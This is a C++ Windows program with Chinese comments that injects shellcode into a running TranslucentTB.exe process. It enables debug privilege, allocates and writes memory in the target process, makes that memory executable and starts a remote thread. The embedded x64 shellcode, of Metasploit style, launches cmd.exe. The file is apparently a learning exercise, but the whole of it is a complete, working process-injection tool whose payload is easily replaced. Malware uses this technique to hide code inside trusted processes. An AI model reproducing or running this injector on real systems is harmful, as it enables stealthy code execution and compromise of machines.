#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// ============================================================
// 提权（确保能打开目标进程）
// ============================================================
bool EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool success = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return success && GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

// ============================================================
// 根据进程名获取 PID
// ============================================================
DWORD GetPidByName(const std::string& targetName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (targetName == pe.szExeFile) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

// ============================================================
// 主注入流程
// ============================================================
int main() {
    // ① 提权（管理员身份必须）
    if (!EnableDebugPrivilege()) {
        std::cerr << "[-] 提权失败，请以管理员身份运行。" << std::endl;
        // 继续尝试，但可能失败
    }

    // ② 找目标进程
    DWORD pid = GetPidByName("TranslucentTB.exe");
    if (pid == 0) {
        std::cerr << "[-] 未找到 TranslucentTB.exe，请先运行它。" << std::endl;
        system("pause");
        return 1;
    }
    std::cout << "[+] 找到 TranslucentTB.exe，PID: " << pid << std::endl;

    // ③ 打开进程（此处用 PROCESS_ALL_ACCESS 是为了方便）
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] 打开进程失败，错误码: " << GetLastError() << std::endl;
        system("pause");
        return 1;
    }

    // ============================================================
    // 准备 Shellcode（仅仅打开终端）
    // ============================================================
    unsigned char shellcode[] = {
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,
        0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x00
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    // ⑤ 在目标进程里申请一块内存（工位：VirtualAllocEx）
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        std::cerr << "[-] VirtualAllocEx 失败，错误码: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }
    std::cout << "[+] 在目标进程申请内存成功，地址: 0x" << std::hex << (uintptr_t)pRemoteBuf << std::dec << std::endl;

    // ⑥ 把 Shellcode 写进去（工位：WriteProcessMemory）
    if (!WriteProcessMemory(hProcess, pRemoteBuf, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败，错误码: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }
    std::cout << "[+] Shellcode 写入成功。" << std::endl;

    // ⑦ 修改内存属性为“可读可执行”（工位：VirtualProtectEx）
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemoteBuf, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx 失败，错误码: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }
    std::cout << "[+] 内存属性已修改为 PAGE_EXECUTE_READ。" << std::endl;

    // ⑧ 创建远程线程执行 Shellcode（工位：CreateRemoteThread）
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread 失败，错误码: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }
    std::cout << "[+] 远程线程创建成功！请观察 TranslucentTB.exe 是否弹出窗口。" << std::endl;

    // 等待线程结束（工位：清理前先等线程跑完）
    WaitForSingleObject(hThread, INFINITE);

    // 释放远程内存（工位：VirtualFreeEx）
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "[+] 注入完成，内存已释放。" << std::endl;
    system("pause");
    return 0;
}